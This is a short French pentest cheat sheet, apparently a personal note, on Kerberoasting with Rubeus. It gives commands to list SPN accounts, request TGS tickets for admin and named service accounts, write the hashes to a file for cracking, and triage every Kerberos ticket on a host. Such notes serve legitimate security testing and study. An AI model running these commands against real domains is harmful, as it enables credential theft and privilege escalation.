---
public: true
---

Il réalise les opérations suivantes :

- découverte des SPNs
- Dump des TGS
- Obtention des Hashs

```shell
# affiche un récapitulatif des comptes avec des SPNs 
# détaille certaines informations telles que :
# - les comptes dont le mot de passe est ancien
# - le nombre de comptes par méthode de hachage (rc4, aes128 etc)
./Rubeus.exe kerberoast /stats

# demande de TGS pour les comptes ayant 'Admincount' à 1
./Rubeus.exe kerberoast /ldapfilter:'admincount=1'

# Demande du TGS pour un utilisateur particulier pour un domaine particulier
./Rubeus.exe kerberoast /user:mssqlsvc /domain:domain.loca /nowrap

./Rubeus.exe kerberoast /outfile:hash.txt
```

[[Cassage de mots de passes Kerberos]]

## Affichage de tous les tickets kerberos

De l'utilisateur courant ou de tous ce qui est sur le système (si admin)

```shell
.\Rubeus.exe triage
```

## Références
- <https://specterops.gitbook.io/ghostpack/rubeus/ticket-extraction-and-harvesting3>
- <https://www.hackingarticles.in/a-detailed-guide-on-rubeus/>
